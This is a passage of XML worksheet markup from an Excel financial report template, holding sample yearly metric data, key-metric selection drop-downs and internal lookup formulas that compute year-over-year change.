    <row r="7" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B7" s="16" t="s">
        <v>8</v>
      </c>
      <c r="C7" s="17">
        <v>65000</v>
      </c>
      <c r="D7" s="17">
        <v>70962.31</v>
      </c>
      <c r="E7" s="17">
        <v>75924.86</v>
      </c>
      <c r="F7" s="17">
        <v>78901.27</v>
      </c>
      <c r="G7" s="17">
        <v>81674.37</v>
      </c>
      <c r="H7" s="17">
        <v>80883.33</v>
      </c>
      <c r="I7" s="18">
        <v>94419.45</v>
      </c>
    </row>
    <row r="8" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B8" s="16" t="s">
        <v>9</v>
      </c>
      <c r="C8" s="17">
        <v>60000</v>
      </c>
      <c r="D8" s="17">
        <v>64207.3</v>
      </c>
      <c r="E8" s="17">
        <v>68857.69</v>
      </c>
      <c r="F8" s="17">
        <v>75643.25</v>
      </c>
      <c r="G8" s="17">
        <v>76755.259999999995</v>
      </c>
      <c r="H8" s="17">
        <v>77317.83</v>
      </c>
      <c r="I8" s="18">
        <v>73425.990000000005</v>
      </c>
    </row>
    <row r="9" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B9" s="16" t="s">
        <v>10</v>
      </c>
      <c r="C9" s="17">
        <v>4500</v>
      </c>
      <c r="D9" s="17">
        <v>4517.7700000000004</v>
      </c>
      <c r="E9" s="17">
        <v>4656.92</v>
      </c>
      <c r="F9" s="17">
        <v>4974.21</v>
      </c>
      <c r="G9" s="17">
        <v>5024.1099999999997</v>
      </c>
      <c r="H9" s="17">
        <v>5068.42</v>
      </c>
      <c r="I9" s="18">
        <v>5546.88</v>
      </c>
    </row>
    <row r="10" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B10" s="16" t="s">
        <v>11</v>
      </c>
      <c r="C10" s="17">
        <v>2500</v>
      </c>
      <c r="D10" s="17">
        <v>2745.82</v>
      </c>
      <c r="E10" s="17">
        <v>2893.11</v>
      </c>
      <c r="F10" s="17">
        <v>3136.12</v>
      </c>
      <c r="G10" s="17">
        <v>3148.53</v>
      </c>
      <c r="H10" s="17">
        <v>3338.3</v>
      </c>
      <c r="I10" s="18">
        <v>3789.47</v>
      </c>
    </row>
    <row r="11" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B11" s="16" t="s">
        <v>12</v>
      </c>
      <c r="C11" s="17">
        <v>54000</v>
      </c>
      <c r="D11" s="17">
        <v>54761.074999999997</v>
      </c>
      <c r="E11" s="17">
        <v>55860.81</v>
      </c>
      <c r="F11" s="17">
        <v>59747.95</v>
      </c>
      <c r="G11" s="17">
        <v>61483.59</v>
      </c>
      <c r="H11" s="17">
        <v>66272.100000000006</v>
      </c>
      <c r="I11" s="18">
        <v>67474.850000000006</v>
      </c>
    </row>
    <row r="12" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B12" s="16" t="s">
        <v>13</v>
      </c>
      <c r="C12" s="17">
        <v>22000</v>
      </c>
      <c r="D12" s="17">
        <v>23920.54</v>
      </c>
      <c r="E12" s="17">
        <v>25576.74</v>
      </c>
      <c r="F12" s="17">
        <v>27498.86</v>
      </c>
      <c r="G12" s="17">
        <v>28335.67</v>
      </c>
      <c r="H12" s="17">
        <v>29424.53</v>
      </c>
      <c r="I12" s="18">
        <v>31408.25</v>
      </c>
    </row>
    <row r="13" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B13" s="16" t="s">
        <v>14</v>
      </c>
      <c r="C13" s="17">
        <v>32000</v>
      </c>
      <c r="D13" s="17">
        <v>34943.49</v>
      </c>
      <c r="E13" s="17">
        <v>38418.53</v>
      </c>
      <c r="F13" s="17">
        <v>39895.050000000003</v>
      </c>
      <c r="G13" s="17">
        <v>40607.730000000003</v>
      </c>
      <c r="H13" s="17">
        <v>42438.2</v>
      </c>
      <c r="I13" s="18">
        <v>50247.68</v>
      </c>
    </row>
    <row r="14" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B14" s="16" t="s">
        <v>15</v>
      </c>
      <c r="C14" s="17">
        <v>12.8</v>
      </c>
      <c r="D14" s="17">
        <v>12.81</v>
      </c>
      <c r="E14" s="17">
        <v>13.78</v>
      </c>
      <c r="F14" s="17">
        <v>14.29</v>
      </c>
      <c r="G14" s="17">
        <v>15.57</v>
      </c>
      <c r="H14" s="17">
        <v>16.78</v>
      </c>
      <c r="I14" s="18">
        <v>19.96</v>
      </c>
    </row>
    <row r="15" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B15" s="16" t="s">
        <v>16</v>
      </c>
      <c r="C15" s="17">
        <v>18.2</v>
      </c>
      <c r="D15" s="17">
        <v>18.59</v>
      </c>
      <c r="E15" s="17">
        <v>19.22</v>
      </c>
      <c r="F15" s="17">
        <v>20.170000000000002</v>
      </c>
      <c r="G15" s="17">
        <v>20.48</v>
      </c>
      <c r="H15" s="17">
        <v>21.84</v>
      </c>
      <c r="I15" s="18">
        <v>26.01</v>
      </c>
    </row>
    <row r="16" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B16" s="16" t="s">
        <v>17</v>
      </c>
      <c r="C16" s="17">
        <v>19.100000000000001</v>
      </c>
      <c r="D16" s="17">
        <v>20.55</v>
      </c>
      <c r="E16" s="17">
        <v>21.87</v>
      </c>
      <c r="F16" s="17">
        <v>23.19</v>
      </c>
      <c r="G16" s="17">
        <v>24.67</v>
      </c>
      <c r="H16" s="17">
        <v>26.39</v>
      </c>
      <c r="I16" s="18">
        <v>31.08</v>
      </c>
    </row>
    <row r="17" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B17" s="16" t="s">
        <v>18</v>
      </c>
      <c r="C17" s="17">
        <v>12.1</v>
      </c>
      <c r="D17" s="17">
        <v>12.21</v>
      </c>
      <c r="E17" s="17">
        <v>12.59</v>
      </c>
      <c r="F17" s="17">
        <v>13.7</v>
      </c>
      <c r="G17" s="17">
        <v>13.76</v>
      </c>
      <c r="H17" s="17">
        <v>14.59</v>
      </c>
      <c r="I17" s="18">
        <v>14.92</v>
      </c>
    </row>
    <row r="18" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B18" s="16" t="s">
        <v>19</v>
      </c>
      <c r="C18" s="17">
        <v>0.75</v>
      </c>
      <c r="D18" s="17">
        <v>0.79</v>
      </c>
      <c r="E18" s="17">
        <v>0.85</v>
      </c>
      <c r="F18" s="17">
        <v>0.89</v>
      </c>
      <c r="G18" s="17">
        <v>0.91</v>
      </c>
      <c r="H18" s="17">
        <v>1</v>
      </c>
      <c r="I18" s="18">
        <v>1.03</v>
      </c>
    </row>
    <row r="19" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B19" s="16" t="s">
        <v>20</v>
      </c>
      <c r="C19" s="17">
        <v>0.23</v>
      </c>
      <c r="D19" s="17">
        <v>0.25</v>
      </c>
      <c r="E19" s="17">
        <v>0.27</v>
      </c>
      <c r="F19" s="17">
        <v>0.28000000000000003</v>
      </c>
      <c r="G19" s="17">
        <v>0.28999999999999998</v>
      </c>
      <c r="H19" s="17">
        <v>0.3</v>
      </c>
      <c r="I19" s="18">
        <v>0.34</v>
      </c>
    </row>
    <row r="20" spans="2:9" s="5" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B20" s="16"/>
      <c r="C20" s="17"/>
      <c r="D20" s="17"/>
      <c r="E20" s="17"/>
      <c r="F20" s="17"/>
      <c r="G20" s="17"/>
      <c r="H20" s="17"/>
      <c r="I20" s="18"/>
    </row>
    <row r="21" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B21" s="16"/>
      <c r="C21" s="17"/>
      <c r="D21" s="17"/>
      <c r="E21" s="17"/>
      <c r="F21" s="17"/>
      <c r="G21" s="17"/>
      <c r="H21" s="17"/>
      <c r="I21" s="18"/>
    </row>
    <row r="22" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B22" s="16"/>
      <c r="C22" s="17"/>
      <c r="D22" s="17"/>
      <c r="E22" s="17"/>
      <c r="F22" s="17"/>
      <c r="G22" s="17"/>
      <c r="H22" s="17"/>
      <c r="I22" s="18"/>
    </row>
    <row r="23" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B23" s="16"/>
      <c r="C23" s="17"/>
      <c r="D23" s="17"/>
      <c r="E23" s="17"/>
      <c r="F23" s="17"/>
      <c r="G23" s="17"/>
      <c r="H23" s="17"/>
      <c r="I23" s="18"/>
    </row>
    <row r="24" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B24" s="16"/>
      <c r="C24" s="17"/>
      <c r="D24" s="17"/>
      <c r="E24" s="17"/>
      <c r="F24" s="17"/>
      <c r="G24" s="17"/>
      <c r="H24" s="17"/>
      <c r="I24" s="18"/>
    </row>
    <row r="25" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B25" s="16"/>
      <c r="C25" s="17"/>
      <c r="D25" s="17"/>
      <c r="E25" s="17"/>
      <c r="F25" s="17"/>
      <c r="G25" s="17"/>
      <c r="H25" s="17"/>
      <c r="I25" s="18"/>
    </row>
    <row r="26" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B26" s="16"/>
      <c r="C26" s="17"/>
      <c r="D26" s="17"/>
      <c r="E26" s="17"/>
      <c r="F26" s="17"/>
      <c r="G26" s="17"/>
      <c r="H26" s="17"/>
      <c r="I26" s="18"/>
    </row>
    <row r="27" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B27" s="16"/>
      <c r="C27" s="17"/>
      <c r="D27" s="17"/>
      <c r="E27" s="17"/>
      <c r="F27" s="17"/>
      <c r="G27" s="17"/>
      <c r="H27" s="17"/>
      <c r="I27" s="18"/>
    </row>
    <row r="28" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B28" s="16"/>
      <c r="C28" s="17"/>
      <c r="D28" s="17"/>
      <c r="E28" s="17"/>
      <c r="F28" s="17"/>
      <c r="G28" s="17"/>
      <c r="H28" s="17"/>
      <c r="I28" s="18"/>
    </row>
    <row r="29" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B29" s="16"/>
      <c r="C29" s="17"/>
      <c r="D29" s="17"/>
      <c r="E29" s="17"/>
      <c r="F29" s="17"/>
      <c r="G29" s="17"/>
      <c r="H29" s="17"/>
      <c r="I29" s="18"/>
    </row>
    <row r="30" spans="2:9" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B30" s="16"/>
      <c r="C30" s="19"/>
      <c r="D30" s="19"/>
      <c r="E30" s="19"/>
      <c r="F30" s="19"/>
      <c r="G30" s="19"/>
      <c r="H30" s="19"/>
      <c r="I30" s="20"/>
    </row>
  </sheetData>
  <sheetProtection selectLockedCells="1"/>
  <mergeCells count="3">
    <mergeCell ref="B3:I3"/>
    <mergeCell ref="B4:C4"/>
    <mergeCell ref="B1:I2"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:I30">
    <cfRule type="expression" dxfId="1" priority="8">
      <formula>MOD(ROW(),2)=0</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="6">
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Enter financial data of up to 25 key metrics and seven years in table starting in cell B5 in this worksheet. Select cell B4 to navigate to Financial Report worksheet" sqref="A1" xr:uid="{00000000-0002-0000-0100-000000000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Title of this worksheet is in this cell and tip in cell below" sqref="B1:I2" xr:uid="{00000000-0002-0000-0100-000001000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Navigation link to Financial Report worksheet. Enter details in table below" sqref="B4:C4" xr:uid="{00000000-0002-0000-0100-000002000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Tip is in this cell" sqref="B3:I3" xr:uid="{00000000-0002-0000-0100-000003000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Year is automatically updated in this cell. Enter figures for this year in this column under this heading" sqref="C5 D5:I5" xr:uid="{00000000-0002-0000-0100-000004000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Enter Metric Name in this column under this heading" sqref="B5" xr:uid="{00000000-0002-0000-0100-000005000000}"/>
  </dataValidations>
  <hyperlinks>
    <hyperlink ref="B4" location="'Financial Report'!A1" tooltip="Select to navigate to Financial Report worksheet " display="Tap to view Financial Report" xr:uid="{00000000-0004-0000-0100-000000000000}"/>
  </hyperlinks>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.25" right="0.25" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup scale="72" orientation="portrait" r:id="rId1"/>
  <ignoredErrors>
    <ignoredError sqref="C5:I5"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499984740745262"/>
    <pageSetUpPr autoPageBreaks="0"/>
  </sheetPr>
  <dimension ref="B1:H9"/>
  <sheetViews>
    <sheetView showGridLines="0" zoomScaleNormal="100" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.796875" defaultRowHeight="30" customHeight="1" x14ac:dyDescent="0.45"/>
  <cols>
    <col min="1" max="1" width="1.6640625" customWidth="1"/>
    <col min="2" max="2" width="4.1328125" customWidth="1"/>
    <col min="3" max="3" width="23.796875" customWidth="1"/>
    <col min="4" max="4" width="3.796875" customWidth="1"/>
    <col min="5" max="6" width="18" customWidth="1"/>
    <col min="9" max="9" width="1.6640625" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="2:8" ht="8.25" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B1" s="96" t="s">
        <v>21</v>
      </c>
      <c r="C1" s="96"/>
      <c r="D1" s="96"/>
      <c r="E1" s="96"/>
      <c r="F1" s="96"/>
      <c r="G1" s="96"/>
      <c r="H1" s="96"/>
    </row>
    <row r="2" spans="2:8" ht="38.25" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B2" s="96"/>
      <c r="C2" s="96"/>
      <c r="D2" s="96"/>
      <c r="E2" s="96"/>
      <c r="F2" s="96"/>
      <c r="G2" s="96"/>
      <c r="H2" s="96"/>
    </row>
    <row r="3" spans="2:8" ht="25.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B3" s="98" t="s">
        <v>22</v>
      </c>
      <c r="C3" s="98"/>
      <c r="D3" s="98"/>
      <c r="E3" s="98"/>
      <c r="F3" s="98"/>
      <c r="G3" s="98"/>
      <c r="H3" s="98"/>
    </row>
    <row r="4" spans="2:8" ht="30" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B4" s="97" t="s">
        <v>34</v>
      </c>
      <c r="C4" s="97"/>
      <c r="D4" s="97"/>
    </row>
    <row r="5" spans="2:8" s="12" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B5" s="51">
        <v>1</v>
      </c>
      <c r="C5" s="35" t="s">
        <v>7</v>
      </c>
      <c r="D5" s="11" t="str">
        <f>IF(ISBLANK(C5),"← Please select a value from drop-down",IF(COUNTIF($C$5:C5,C5)&gt;1,"You have selected "&amp;C5&amp;" twice.",""))</f>
        <v/>
      </c>
      <c r="G5"/>
    </row>
    <row r="6" spans="2:8" s="12" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B6" s="52">
        <v>2</v>
      </c>
      <c r="C6" s="36" t="s">
        <v>12</v>
      </c>
      <c r="D6" s="11" t="str">
        <f>IF(ISBLANK(C6),"← Please select a value from drop-down",IF(COUNTIF($C$5:C6,C6)&gt;1,"You have selected "&amp;C6&amp;" twice.",""))</f>
        <v/>
      </c>
      <c r="G6"/>
    </row>
    <row r="7" spans="2:8" s="12" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B7" s="52">
        <v>3</v>
      </c>
      <c r="C7" s="37" t="s">
        <v>11</v>
      </c>
      <c r="D7" s="11" t="str">
        <f>IF(ISBLANK(C7),"← Please select a value from drop-down",IF(COUNTIF($C$5:C7,C7)&gt;1,"You have selected "&amp;C7&amp;" twice.",""))</f>
        <v/>
      </c>
      <c r="G7"/>
    </row>
    <row r="8" spans="2:8" s="12" customFormat="1" ht="30" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B8" s="52">
        <v>4</v>
      </c>
      <c r="C8" s="37" t="s">
        <v>10</v>
      </c>
      <c r="D8" s="11" t="str">
        <f>IF(ISBLANK(C8),"← Please select a value from drop-down",IF(COUNTIF($C$5:C8,C8)&gt;1,"You have selected "&amp;C8&amp;" twice.",""))</f>
        <v/>
      </c>
    </row>
    <row r="9" spans="2:8" s="12" customFormat="1" ht="30" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B9" s="53">
        <v>5</v>
      </c>
      <c r="C9" s="38" t="s">
        <v>9</v>
      </c>
      <c r="D9" s="11" t="str">
        <f>IF(ISBLANK(C9),"← Please select a value from drop-down",IF(COUNTIF($C$5:C9,C9)&gt;1,"You have selected "&amp;C9&amp;" twice.",""))</f>
        <v/>
      </c>
    </row>
  </sheetData>
  <sheetProtection selectLockedCells="1"/>
  <mergeCells count="3">
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B3:H3"/>
    <mergeCell ref="B1:H2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:C9">
    <cfRule type="expression" dxfId="0" priority="1">
      <formula>MOD(ROW(),2)</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="4">
    <dataValidation type="list" errorStyle="warning" allowBlank="1" showInputMessage="1" showErrorMessage="1" error="Select Key Metric from the list. Select CANCEL, press ALT+DOWN ARROW for options, then DOWN ARROW and ENTER to make selection" prompt="Select Key Metric in this cell. Press ALT+DOWN ARROW for options, then DOWN ARROW and ENTER to make selection" sqref="C5:C9" xr:uid="{00000000-0002-0000-0200-000000000000}">
      <formula1>lstMetrics</formula1>
    </dataValidation>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Select Key Metrics to be shown at the top of the annual financial report in this worksheet. Select cell B4 to navigate to Financial Report worksheet" sqref="A1" xr:uid="{00000000-0002-0000-0200-000001000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Title of this worksheet is in this cell and tip in cell below" sqref="B1:H2" xr:uid="{00000000-0002-0000-0200-000002000000}"/>
    <dataValidation allowBlank="1" showInputMessage="1" showErrorMessage="1" prompt="Navigation link to Financial Report worksheet. Select Key Metrics in cells below, cells C5 through C9" sqref="B4:D4" xr:uid="{00000000-0002-0000-0200-000003000000}"/>
  </dataValidations>
  <hyperlinks>
    <hyperlink ref="B4:C4" location="'Financial Report'!A1" tooltip="View financial report" display="  Click to view Financial Report" xr:uid="{00000000-0004-0000-0200-000000000000}"/>
    <hyperlink ref="B4:D4" location="'Financial Report'!A1" tooltip="Select to navigate to Financial Report worksheet" display="  Tap to view Financial Report" xr:uid="{00000000-0004-0000-0200-000001000000}"/>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39"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.796875" defaultRowHeight="14.25" x14ac:dyDescent="0.45"/>
  <cols>
    <col min="2" max="2" width="32.6640625" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="12" customFormat="1" ht="34.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A1" s="13" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="2" spans="1:9" s="12" customFormat="1" x14ac:dyDescent="0.45">
      <c r="D2" s="6" t="s">
        <v>24</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B3" t="s">
        <v>25</v>
      </c>
      <c r="C3" s="2">
        <f>SelectedYear</f>
        <v>2018</v>
      </c>
      <c r="D3">
        <f ca="1">MATCH(C3,lstYears,0)+1</f>
        <v>6</v>
      </c>
    </row>
    <row r="4" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="B4" t="s">
        <v>26</v>
      </c>
      <c r="C4" s="2">
        <f>C3-1</f>
        <v>2017</v>
      </c>
      <c r="D4">
        <f ca="1">MATCH(C4,lstYears,0)+1</f>
        <v>5</v>
      </c>
    </row>
    <row r="5" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45"/>
    <row r="6" spans="1:9" ht="19.5" customHeight="1" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B6" t="s">
        <v>24</v>
      </c>
      <c r="C6" s="1">
        <f ca="1">MATCH(C7,lstYears,0)+1</f>
        <v>2</v>
      </c>
      <c r="D6" s="1">
        <f ca="1">MATCH(D7,lstYears,0)+1</f>
        <v>3</v>
      </c>
      <c r="E6" s="1">
        <f ca="1">MATCH(E7,lstYears,0)+1</f>
        <v>4</v>
      </c>
      <c r="F6" s="1">
        <f ca="1">MATCH(F7,lstYears,0)+1</f>
        <v>5</v>
      </c>
      <c r="G6" s="1">
        <f ca="1">MATCH(G7,lstYears,0)+1</f>
        <v>6</v>
      </c>
      <c r="I6">
        <f ca="1">COUNT(C6:G6)</f>
        <v>5</v>
      </c>
    </row>
    <row r="7" spans="1:9" ht="18.399999999999999" thickBot="1" x14ac:dyDescent="0.6">
      <c r="B7" s="7" t="s">
        <v>27</v>
      </c>
      <c r="C7" s="14">
        <f>D7-1</f>
        <v>2014</v>
      </c>
      <c r="D7" s="14">
        <f>E7-1</f>
        <v>2015</v>
      </c>
      <c r="E7" s="14">
        <f>F7-1</f>
        <v>2016</v>
      </c>
      <c r="F7" s="14">
        <f>G7-1</f>
        <v>2017</v>
      </c>
      <c r="G7" s="14">
        <f>C3</f>
        <v>2018</v>
      </c>
      <c r="H7" s="7"/>
    </row>
    <row r="8" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A8">
        <f>MATCH(B8,'Financial Data Input'!$B$6:$B$30,0)</f>
        <v>1</v>
      </c>
      <c r="B8" t="str">
        <f>IF('Key Metric Settings'!C5="","",'Key Metric Settings'!C5)</f>
        <v>REVENUES</v>
      </c>
      <c r="C8">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A8,C$6),NA())</f>
        <v>125000</v>
      </c>
      <c r="D8">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A8,D$6),NA())</f>
        <v>134137.45000000001</v>
      </c>
      <c r="E8">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A8,E$6),NA())</f>
        <v>142728.38</v>
      </c>
      <c r="F8">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A8,F$6),NA())</f>
        <v>150687.46</v>
      </c>
      <c r="G8">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A8,G$6),NA())</f>
        <v>165044.56</v>
      </c>
      <c r="H8" s="3">
        <f ca="1">IFERROR(G8/F8-1,"")</f>
        <v>9.5277337609911417E-2</v>
      </c>
    </row>
    <row r="9" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A9">
        <f>MATCH(B9,'Financial Data Input'!$B$6:$B$30,0)</f>
        <v>6</v>
      </c>
      <c r="B9" t="str">
        <f>IF('Key Metric Settings'!C6="","",'Key Metric Settings'!C6)</f>
        <v>NET PROFIT</v>
      </c>
      <c r="C9">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A9,C$6),NA())</f>
        <v>54000</v>
      </c>
      <c r="D9">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A9,D$6),NA())</f>
        <v>54761.074999999997</v>
      </c>
      <c r="E9">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A9,E$6),NA())</f>
        <v>55860.81</v>
      </c>
      <c r="F9">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A9,F$6),NA())</f>
        <v>59747.95</v>
      </c>
      <c r="G9">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A9,G$6),NA())</f>
        <v>61483.59</v>
      </c>
      <c r="H9" s="3">
        <f t="shared" ref="H9:H12" ca="1" si="0">IFERROR(G9/F9-1,"")</f>
        <v>2.9049364873606542E-2</v>
      </c>
    </row>
    <row r="10" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A10">
        <f>MATCH(B10,'Financial Data Input'!$B$6:$B$30,0)</f>
        <v>5</v>
      </c>
      <c r="B10" t="str">
        <f>IF('Key Metric Settings'!C7="","",'Key Metric Settings'!C7)</f>
        <v>INTEREST</v>
      </c>
      <c r="C10">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A10,C$6),NA())</f>
        <v>2500</v>
      </c>
      <c r="D10">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A10,D$6),NA())</f>
        <v>2745.82</v>
      </c>
      <c r="E10">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A10,E$6),NA())</f>
        <v>2893.11</v>
      </c>
      <c r="F10">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A10,F$6),NA())</f>
        <v>3136.12</v>
      </c>
      <c r="G10">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A10,G$6),NA())</f>
        <v>3148.53</v>
      </c>
      <c r="H10" s="3">
        <f t="shared" ca="1" si="0"/>
        <v>3.9571189877938284E-3</v>
      </c>
    </row>
    <row r="11" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A11">
        <f>MATCH(B11,'Financial Data Input'!$B$6:$B$30,0)</f>
        <v>4</v>
      </c>
      <c r="B11" t="str">
        <f>IF('Key Metric Settings'!C8="","",'Key Metric Settings'!C8)</f>
        <v>DEPRECIATION</v>
      </c>
      <c r="C11">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A11,C$6),NA())</f>
        <v>4500</v>
      </c>
      <c r="D11">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A11,D$6),NA())</f>
        <v>4517.7700000000004</v>
      </c>
      <c r="E11">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A11,E$6),NA())</f>
        <v>4656.92</v>
      </c>
      <c r="F11">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A11,F$6),NA())</f>
        <v>4974.21</v>
      </c>
      <c r="G11">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A11,G$6),NA())</f>
        <v>5024.1099999999997</v>
      </c>
      <c r="H11" s="3">
        <f t="shared" ca="1" si="0"/>
        <v>1.0031743734180809E-2</v>
      </c>
    </row>
    <row r="12" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A12">
        <f>MATCH(B12,'Financial Data Input'!$B$6:$B$30,0)</f>
        <v>3</v>
      </c>
      <c r="B12" t="str">
        <f>IF('Key Metric Settings'!C9="","",'Key Metric Settings'!C9)</f>
        <v>OPERATING PROFIT</v>
      </c>
      <c r="C12">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A12,C$6),NA())</f>
        <v>60000</v>
      </c>
      <c r="D12">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A12,D$6),NA())</f>
        <v>64207.3</v>
      </c>
      <c r="E12">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A12,E$6),NA())</f>
        <v>68857.69</v>
      </c>
      <c r="F12">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A12,F$6),NA())</f>
        <v>75643.25</v>
      </c>
      <c r="G12">
        <f ca="1">IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A12,G$6),NA())</f>
        <v>76755.259999999995</v>
      </c>
      <c r="H12" s="3">
        <f t="shared" ca="1" si="0"/>
        <v>1.4700716851800966E-2</v>
      </c>
    </row>
    <row r="13" spans="1:9" ht="14.65" thickBot="1" x14ac:dyDescent="0.5"/>
    <row r="14" spans="1:9" ht="18.399999999999999" thickBot="1" x14ac:dyDescent="0.5">
      <c r="B14" s="7" t="s">
        <v>28</v>
      </c>
      <c r="C14" s="7"/>
      <c r="D14" s="7"/>
      <c r="E14" s="7"/>
      <c r="F14" s="7"/>
      <c r="G14" s="7"/>
      <c r="H14" s="7"/>
    </row>
    <row r="15" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A15">
        <f>ROWS($B$15:B15)</f>
        <v>1</v>
      </c>
      <c r="B15" t="str">
        <f>IF('Financial Data Input'!B6=0,"",'Financial Data Input'!B6)</f>
        <v>REVENUES</v>
      </c>
      <c r="C15">
        <f ca="1">IF(B15="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A15,C$6),NA()))</f>
        <v>125000</v>
      </c>
      <c r="D15">
